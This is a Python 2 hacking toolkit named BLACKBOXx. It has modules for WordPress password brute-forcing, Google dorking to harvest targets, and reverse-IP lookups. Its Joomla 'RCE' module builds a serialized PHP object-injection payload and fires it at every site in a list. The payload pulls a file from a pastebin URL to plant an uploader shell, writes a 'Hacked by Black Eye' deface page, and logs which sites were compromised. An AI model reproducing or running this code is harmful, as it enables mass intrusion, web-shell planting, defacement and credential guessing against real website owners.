#!/usr/bin/env python
#####################################NOTICE######################################
###     This program is free software: you can redistribute it and/or modify  ###
###     it under the terms of the GNU General Public License as published by  ###
###     the Free Software Foundation, either version 3 of the License, or     ###
###     (at your option) any later version.                                   ###
###     This program is distributed in the hope that it will be useful,       ###
###                                                                           ###
###     but WITHOUT ANY WARRANTY; without even the implied warranty of        ###
###     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the         ###
###     GNU General Public License for more details.                          ###
###     You should have received a copy of the GNU General Public License     ###
###     along with this program.  If not, see <http://www.gnu.org/licenses/>  ###
#################################################################################
import requests,json,sys, time, re, git, os
from time import gmtime, strftime
from optparse import OptionParser

__author__     = 'Black Eye'
__bitbucket__  = 'https://bitbucket.org/darkeye/'
__emailadd__   = 'blackdoor197@yahoo.co.uk'
__twitter__    = 'https://twitter.com/darkeyepy'
__version__    = '0.7'
__license__    = 'GPLv2'
__scrname__    = 'BLACKBOXx v%s' % (__version__)

def __banner__():
	print color.BOLD+color.Y+" _____ __    _____ _____ _____ _____ _____ __ __"
	print color.BOLD+color.Y+"| __  |  |  |  _  |     |  |  | __  |     |  |  |_ _"
	print color.BOLD+color.Y+"| __ -|  |__|     |   --|    -| __ -|  |  |-   -|_'_|"
	print color.BOLD+color.Y+"|_____|_____|__|__|_____|__|__|_____|_____|__|__|_,_|"
	print color.W+color.BOLD+"\t\t\t\t\t\t     {"+color.C+__version__+"#Dev"+color.W+"}"+color.ENDC

def __help__():
	print color.W+color.BOLD+"Usage   : "+color.ENDC+sys.argv[0]+" {Module}"
	print color.BOLD+color.W+"Help    : "+color.ENDC+sys.argv[0]+" -h/--help"
	print color.W+color.BOLD+"Modules : "+color.ENDC
	print "\t\t+ Wordpress Bruteforce          :   wordpress_brute"
	print "\t\t+ Dnsinfo                       :   dns_info"
	print "\t\t+ Joomla Rce                    :   rce_joomla"
	print "\t\t+ Google Dorker                 :   google_dorker"
	print "\t\t+ update Database (sudo needed) :   -u/--update"

def __update__():
	try:
		os.chdir('/tmp')
		git.Git().clone("https://darkeye@bitbucket.org/darkeye/blackboxx.git", "blackbox")
		print "Database Updated !"
	except git.exc.GitCommandError as e:
		print "Error "+str(e)

class color:
	P    =  '\033[95m' # purple
	B    =  '\033[94m' # Blue
	BOLD =  '\033[1m'  # Bold
	G    =  '\033[92m' # Green
	Y    =  '\033[93m' # Yellow
	R    =  '\033[91m' # Red
	W    =  '\033[97m' # White
	BL   =  '\033[90m' # Black
	M    =  '\033[95m' # Magenta
	C    =  '\033[96m' # Cyan
	ENDC =  '\033[0m'  # end colors

class dorker():
	def google(self, dork, page, ssl):
		from google import search
		search = search(dork,start=0, stop=page)
		non_ssl_s, ssl_s = [], []
		for url in search:
			if "https:" in url:
				ssl_s.append(url)
			if "http:" in url:
				non_ssl_s.append(url)
		if ssl==True:
			print color.BOLD+color.W+"[+] "+color.R+str(len(ssl_s))+color.W+" Found !"+color.ENDC
			for s in ssl_s:
				print s
		if ssl==False:
			print color.BOLD+color.W+"[+] "+color.R+str(len(non_ssl_s))+color.W+" Found !"+color.ENDC
			for k in non_ssl_s:
				print k
	def __init__(self):
		pass

class BruteForce:
	def wordpress(self, url, username,wordlist):
		headers = {
		'user-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0'
		}
		#ok = time.strftime("%H:%M:%S")
		time.ctime()
		ok = time.strftime('%H:%M:%S')
		datetime = '['+ok+']'

		url = "http://"+url+"/wp-login.php"
		if not requests.get(url).status_code == 200:
			print "Error with  : "+url+"\nResponse is : "+str(requests.get(url).status_code)
			return 1
		print color.G+datetime+color.ENDC+" Starting Attack ! "
		print color.G+datetime+color.W+" wordpress  : "+color.Y+url
		word = open(wordlist, 'r')
		word = word.readlines()
		for words in word:
			words = words.strip()
			
			payload = {'log' : username,
			           'pwd' : words}
			
			s = requests.post(url, data=payload, headers=headers)
			print color.R+"------------------------------------------------------------------"
			print color.G+datetime+color.W+" username   : "+color.Y+payload['log']
			print color.G+datetime+color.W+" password   : "+color.Y+payload['pwd']
			if "wp-admin" in s.url:
				print color.G+datetime+color.R+" Login Succes"+color.ENDC
				print color.R+"------------------------------------------------------------------"+color.ENDC				
				break
			elif "wp-login.php" in s.url:
				print color.G+datetime+color.C+" Login False"+color.ENDC
	def ftp_brute(self, url, wordlist):
		pass
	def ssh_brute(self, url, wordlist):
		pass
	def joomla(self, url, wordlist):
		pass

class rce:
	def joomla(self, wordlist):
		wordlist = open(wordlist, "r")
		def get_url(url, user_agent):
			headers = {
			'User-Agent': user_agent
			}
			cookies = requests.get(url,headers=headers).cookies
			for _ in range(3):
				response = requests.get(url, headers=headers,cookies=cookies)    
			return response.content
		def php_str_noquotes(data):
			encoded = ""
			for char in data:
				encoded += "chr({0}).".format(ord(char))
			return encoded[:-1]
		def generate_payload(php_payload):
			php_payload = "eval({0})".format(php_str_noquotes(php_payload))
			terminate = '\xf0\xfd\xfd\xfd';
			exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
			injected_payload = "{};JFactory::getConfig();exit".format(php_payload)    
			exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
			exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
			return exploit_template
		pl = generate_payload("fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/up.php','w+'),file_get_contents('http://pastebin.com/raw/uWVsQH53')); fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/x.htm','w+'),'Hacked by Black Eye');")
		for i in wordlist.readlines():
			i=i.strip()
			get_url(i, pl)
			lala=requests.get(i+"/x.htm")
			if "Hacked" in lala.content:
				print i+"/x.htm  : Defaced | /up.php uploader file "
				z=open('Joomla_3.5_Shell.txt','a')
				z.write(i+"/x.htm\n")
				z.close()
			else:
				print i+" : Not Defaced"
			#wordlist.close()
	def magento(self):
		pass

class dnsinfo:
	def checkhost(self, url):
		get = requests.get(url).status_code
		if get==200:
			pass
	def yougetsignal(self, ip):
		def Details():
			yougetsignal = 'http://domains.yougetsignal.com/domains.php'
			data = {
			'remoteAddress': ip,
			'key'          : ''}
			headers={
			'User-Agent'  : 'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0',
			'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}

			get = requests.post(yougetsignal, data=data, headers=headers)
			get = get.text

			ok = json.loads(get)
			return ok
		
		def rzlt(details):
			print color.G+"Domains Hosted : "+color.W+color.BOLD+details['domainCount']+color.ENDC
			print color.G+"IP Address     : "+color.W+color.BOLD+details['remoteIpAddress']+color.ENDC
			print color.G+"Remote Address : "+color.W+color.BOLD+details['remoteAddress']+color.ENDC
			ipp = details['remoteIpAddress']
			rzt = open(ipp+".txt" ,'a')
			for domains,bl in details['domainArray']:
				rzt.write(domains+"\n")
			rzt.close
			print color.W+color.BOLD+"Domains is saved in "+ipp+".txt"+color.ENDC
		details = Details()
		rzlt(details)
	def viewdns(self, ip):
		viewdns = 'http://viewdns.info/reverseip/?host='
		dns = viewdns+ip+"&t=1"
		get = requests.get(dns)
		get = get.text
		black =re.findall(r"<td>(.*?)</td><td align=", get)
		for i in black:
			i=i.strip().lower()
			print i
def __main__():
	__banner__()
	for arg in sys.argv:
		if (arg=="--help" or arg=="-h"):
			__help__()
		if (arg=="wordpress_brute"):
			parser = OptionParser()
			parser.add_option("--url",
				help="URL OF Target")
			parser.add_option("--username","-u",
				help="Username of Wordpress")
			parser.add_option("--wordlist","-w",
				help="Wordlist for attack target")
			(options,args) = parser.parse_args()
			url = options.url
			username = options.username
			wordlist = options.wordlist
			if url and username and wordlist:
				BruteForce().wordpress(url, username, wordlist)
				break
			errors = []
			if (url == None):
				errors.append("[-] No URL specified.")
			if (username == None):
				errors.append("[-] No username specified.")
			if (wordlist == None):
				errors.append("[-] No Wordlist path specified.")
			if (len(errors) > 0):
				for error in errors:
					print color.BOLD+error+color.ENDC
		if (arg == "dns_info"):
			parser = OptionParser()
			parser.add_option("--ip",
				help="Parse IP address")
			parser.add_option("--viewdns","-v",
				help="Get website from viewdns",action="store_true")
			parser.add_option("--yougetsignal","-y",
				help="Get website from yougetsignal",action="store_true")
			(options,args) = parser.parse_args()
			ip = options.ip
			viewdns = options.viewdns
			yougetsignal = options.yougetsignal
			if ip and viewdns==True:
				dnsinfo().viewdns(ip)
			if ip and yougetsignal==True:
				dnsinfo().yougetsignal(ip)
		if (arg=="rce_joomla"):
			parser = OptionParser()
			parser.add_option("--wordlist","-w",
				help="wordlist path")
			(options,args) = parser.parse_args()
			wordlist = options.wordlist
			if wordlist:
				rce().joomla(wordlist)
		if (arg=="google_dorker"):
			parser = OptionParser()
			parser.add_option("--dork","-d",
				help="Dork for get URL")
			parser.add_option("--page","-p", metavar="NUMBER", type=int, default=0,
				help="Number of page")
			parser.add_option("--ssl",
				help="Get HTTPS(SSL) Website",action="store_true")
			parser.add_option("--no-ssl",
				help="Get HTTP Website",action="store_true")
			(options,args) = parser.parse_args()
			dork = options.dork
			page = options.page
			ssl  = options.ssl
			no_ssl = options.no_ssl
			if dork and page and ssl==True:
				print color.BOLD+color.W+"[+] Grab SSL Website from Google With dork : "+dork+color.ENDC
				dorker().google(dork, page, ssl=True)
			if dork and page and no_ssl==True:
				print color.BOLD+color.W+"[+] Grab NO SSL Website from Google With dork : "+dork+color.ENDC
				dorker().google(dork, page, ssl=False)

		if (arg=="-u" or arg=="--update"):
			__update__()

if __name__ == '__main__':
	try:
		__main__()
	except KeyboardInterrupt:
		print color.BOLD+color.Y+"Exiting Now !"+color.ENDC
		sys.exit(0)